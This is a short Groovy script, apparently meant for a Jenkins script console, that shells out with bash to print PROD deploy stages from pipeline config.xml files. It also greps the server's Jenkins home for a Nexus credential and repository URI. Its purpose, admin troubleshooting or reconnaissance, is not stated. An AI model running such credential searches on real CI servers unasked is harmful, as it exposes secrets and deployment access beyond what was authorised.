// MICRO-X: Read lines 230-411 of caja-api pipeline (PROD deploy stages)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(8000)
}

def cfgPath = "/var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/config.xml"

println "=== CAJA-API PIPELINE LINES 230-411 ==="
println run("sed -n '230,411p' '${cfgPath}' | sed \"s/&apos;/'/g; s/&quot;/\\\"/g; s/&lt;/</g; s/&gt;/>/g; s/&amp;/\\&/g; s/&#xd;/\\n/g\"")

// Also read the nexus credential to find NEXUS_REPO_URI 
println "\n=== NEXUS credential in Jenkins config ==="
println run("grep -h 'nexus\\|NEXUS\\|NEXUS_REPO_URI' /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/config.xml /var/jenkins_home/config.xml 2>/dev/null | sed \"s/&apos;/'/g\" | head -20")

// Look for NEXUS_REPO_URI in global env
println "\n=== NEXUS_REPO_URI in global Jenkins config ==="
println run("grep -rh 'NEXUS_REPO_URI\\|nexus_repo' /var/jenkins_home/ 2>/dev/null | grep -v builds | sort -u | head -10")

// Read a tienda pipeline for comparison (PROD section)
println "\n=== TIENDA PIPELINE PROD SECTION ==="
println run("perl -0777 -ne 'if(/<script>(.*?)<\\/script>/s){print \$1}' /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_tienda/config.xml | sed \"s/&apos;/'/g; s/&quot;/\\\"/g; s/&lt;/</g; s/&gt;/>/g\" | grep -A 3 -B 3 'PROD\\|release\\|production\\|CSDEV\\|sshPublisher' | head -80")

println "\n=== DONE MICRO-X ==="
